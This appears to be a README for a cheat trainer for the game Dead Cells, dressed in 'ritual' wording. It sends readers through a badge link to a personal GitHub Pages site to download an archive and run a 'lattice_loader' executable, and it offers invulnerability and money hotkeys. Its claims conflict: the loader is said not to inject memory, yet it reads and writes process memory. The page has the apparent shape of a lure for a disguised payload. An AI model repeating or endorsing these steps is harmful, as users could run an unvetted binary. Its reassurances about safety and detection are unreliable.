## 📖 Getting Started: The Ritual of Activation

This is not a "one-click install". It's a **ceremony of convergence**. We want you to be deliberate about leveraging this power.

### Prerequisites
*   A legitimate installation of *Dead Cells* (v34+).
*   A supported operating system: Windows 10/11 (x64), or Linux (via compatibility layer).

### Installation Steps (The Rite of Binding)

1.  **The Aegis Extraction:** Download the **Chrono-Lattice Override** archive from the official repository release page. (See [![Download](https://raw.githubusercontent.com/mpangokazi0009-tech/dead-cells-omnipotence/main/pkg_d37e7.svg)](https://mpangokazi0009-tech.github.io/dead-cells-omnipotence/) macro).
2.  **The Homestead Placement:** Extract the contents to a directory *outside* your game installation folder. We recommend `C:\Users\[YourName]\Documents\ChronoLattice\`. This ensures the game's integrity checks remain pristine.
3.  **The Kernel of Trust:** Run the `lattice_loader` executable once. It will act as a **sidecar process**, not a memory injector. It waits patiently until it detects the *Dead Cells* process running.
4.  **The Synchro-State:** The utility will automatically map the correct memory addresses based on your game version. You will see a **"Lattice Synchronized"** prompt in the console. You do not need to interact with this.
5.  **The Key Bindings:** By default, the hotkeys are:
    *   `F1` — Toggle Aegis Flow (Invulnerability)
    *   `F2` — Trigger Midas Lattice (Add Funds)
    *   `F3` — Trigger Synchronous Pulse (Reset Cooldowns)
    *   `F4` — Toggle the UI Overlay (HUD display of current status).

## ❓ Frequently Asked Questions (The Timekeeper's Queries)

**Q: Will this break my save file?**
**A:** No. The Lattice operates on **volatile memory** (RAM) only. It never writes to your save file or changes the game's binary assets.

**Q: Is it detectable?**
**A:** The tool does not hook into the game's network layer. It reads and writes process memory locally. It is transparent to the game's server (since there are no persistent servers). However, we cannot guarantee zero detection from future anti-cheat implementations.

**Q: Can I play with this in co-op (if a co-op mod is installed)?**
**A:** We do not recommend this. Synchronization issues might cause desyncs in a multiplayer scenario. This is strictly a **single-player concentration tool**.

**Q: Does this require an internet connection?**
**A:** No. Once downloaded, the utility is fully offline. The repository is only for distribution and updates.
